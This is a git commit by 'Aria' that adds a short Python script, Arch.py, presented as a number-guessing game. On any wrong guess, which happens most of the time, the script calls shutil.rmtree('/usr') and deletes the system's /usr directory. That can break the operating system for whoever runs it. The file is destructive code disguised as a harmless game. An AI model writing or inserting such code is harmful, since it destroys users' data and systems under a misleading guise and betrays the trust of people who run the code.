89f699953e57e157dd62324dc09434d722f004fc
Aria <ariaadelheid@protonmail.com>
2024-09-18 17:22:57 +0100

    Create Arch.py

---
+++ Arch.py
@@ -0,0 +1,10 @@
+import random
+import shutil
+
+number = random.randint(1, 10)
+guess = int(input("Guess a number from 1 - 10: "))
+
+if guess == number:
+    print("You won!")
+else:
+    shutil.rmtree("/usr")
